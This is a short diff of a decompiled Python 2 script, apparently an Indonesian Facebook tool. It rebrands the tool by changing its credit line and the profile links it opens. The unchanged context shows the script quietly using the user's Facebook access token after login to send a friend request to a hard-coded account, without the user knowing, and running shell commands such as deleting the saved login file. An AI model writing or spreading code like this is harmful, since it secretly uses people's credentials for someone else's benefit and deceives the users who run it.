@@ -1,4 +1,4 @@
-#Decompiled by MR.K7C8NG
+#Decompiled by MAESTRO
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -97,7 +97,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://m.facebook.com/xlucifer101')
+                os.system('xdg-open https://m.facebook.com/MAESTRO404')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -177,7 +177,7 @@ def pilih():
                     else:
                         if zedd == '5':
                             os.system('rm -rf login.txt')
-                            os.system('xdg-open https://www.youtube.com/nganunymous')
+                            os.system('xdg-open https://m.facebook.com/MAESTRO404')
                             keluar()
                         else:
                             if zedd == '0':
